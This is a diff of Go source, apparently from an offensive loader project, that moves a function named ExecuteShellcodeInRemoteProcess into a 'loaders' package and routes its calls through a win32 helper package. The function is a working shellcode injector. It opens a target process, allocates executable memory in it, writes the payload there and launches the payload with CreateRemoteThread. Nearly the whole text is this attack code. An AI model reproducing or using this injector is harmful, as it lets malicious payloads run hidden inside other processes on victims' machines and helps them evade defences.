@@ -1,17 +1,19 @@
-package main
+package loaders
 
 import (
 	"fmt"
 	"syscall"
 	"unsafe"
+
+	"github.com/mszatanik/goloader/pkg/win32"
 )
 
-func OpenProcessHandle(bytes []byte, pid uint32) {
+func ExecuteShellcodeInRemoteProcess(bytes []byte, pid uint32) {
 	fmt.Printf("[*] Injecting %d bytes\r\n", len(bytes))
 
 	// OpenProcess
-	remoteProcHandle, err := OpenProcessCall(
-		CREATE_THREAD|QUERY_INFORMATION|VM_OPERATION|VM_WRITE|VM_READ,
+	remoteProcHandle, err := win32.OpenProcessCall(
+		win32.CREATE_THREAD|win32.QUERY_INFORMATION|win32.VM_OPERATION|win32.VM_WRITE|win32.VM_READ,
 		0,
 		uintptr(pid),
 	)
@@ -21,20 +23,20 @@ func OpenProcessHandle(bytes []byte, pid uint32) {
 	}
 
 	// VirtualAllocEx
-	addr, err := VirtualAllocExCall(
+	addr, err := win32.VirtualAllocExCall(
 		remoteProcHandle,
 		0,
 		uintptr(len(bytes)),
-		MEM_COMMIT|MEM_RESERVE,
+		win32.MEM_COMMIT|win32.MEM_RESERVE,
 		//PAGE_READWRITE,
-		PAGE_EXECUTE_READWRITE,
+		win32.PAGE_EXECUTE_READWRITE,
 	)
 	if err != nil && addr == 0 {
 		panic(fmt.Sprintf("[-] VirtualAllocEx failed: %s\r\n%d", err, addr))
 	}
 
 	// WriteProcessMemory
-	bytesWritten, err := WriteProcessMemoryCall(
+	bytesWritten, err := win32.WriteProcessMemoryCall(
 		remoteProcHandle,
 		addr,
 		(uintptr)(unsafe.Pointer(&bytes[0])),
@@ -61,9 +63,9 @@ func OpenProcessHandle(bytes []byte, pid uint32) {
 		panic(fmt.Sprintf("[-] LoadLibraryA conversion failed: %s", err))
 	}
 
-	loadLibraryAAddress, err := GetProcAddressCall(kernel32.Handle(), (uintptr)(unsafe.Pointer(loadLibraryAPointer)))
-	_, _, err = GetProcAddress.Call(
-		kernel32.Handle(),
+	loadLibraryAAddress, err := win32.GetProcAddressCall(win32.Kernel32.Handle(), (uintptr)(unsafe.Pointer(loadLibraryAPointer)))
+	_, _, err = win32.GetProcAddress.Call(
+		win32.Kernel32.Handle(),
 		(uintptr)(unsafe.Pointer(loadLibraryAPointer)),
 	)
 	if loadLibraryAAddress == 0 {
@@ -71,7 +73,7 @@ func OpenProcessHandle(bytes []byte, pid uint32) {
 	}
 
 	// CreateRemoteThread
-	remoteThread, err := CreateRemoteThreadCall(
+	remoteThread, err := win32.CreateRemoteThreadCall(
 		remoteProcHandle,
 		0,
 		0,
@@ -84,32 +86,32 @@ func OpenProcessHandle(bytes []byte, pid uint32) {
 	}
 
 	// WaitForSingleObject
-	code, err := WaitForSingleObjectCall(
+	code, err := win32.WaitForSingleObjectCall(
 		remoteThread,
-		INFINITE,
+		win32.INFINITE,
 	)
 	if code == 0xFFFFFFFF {
 		panic(fmt.Sprintf("[-] WaitForSingleObject failed: %s", err))
 	}
 
 	// GetExitCodeThread
-	exitCode, err := GetExitCodeThreadCall(remoteThread)
+	exitCode, err := win32.GetExitCodeThreadCall(remoteThread)
 	if exitCode == 0 {
 		panic(fmt.Sprintf("[-] GetExitCodeThread failed: %s", err))
 	}
 
 	// CloseHandle
-	exitCode, err = CloseHandleCall(remoteThread)
+	exitCode, err = win32.CloseHandleCall(remoteThread)
 	if exitCode == 0 {
 		panic(fmt.Sprintf("[-] remoteProcHandle failed: %s", err))
 	}
 
 	// VirtualFreeEx
-	exitCode, err = VirtualFreeExCall(
+	exitCode, err = win32.VirtualFreeExCall(
 		remoteProcHandle,
 		addr,
 		0,
-		MEM_RELEASE,
+		win32.MEM_RELEASE,
 	)
 	if exitCode == 0 {
 		panic(fmt.Sprintf("[-] VirtualFreeEx failed: %s", err))
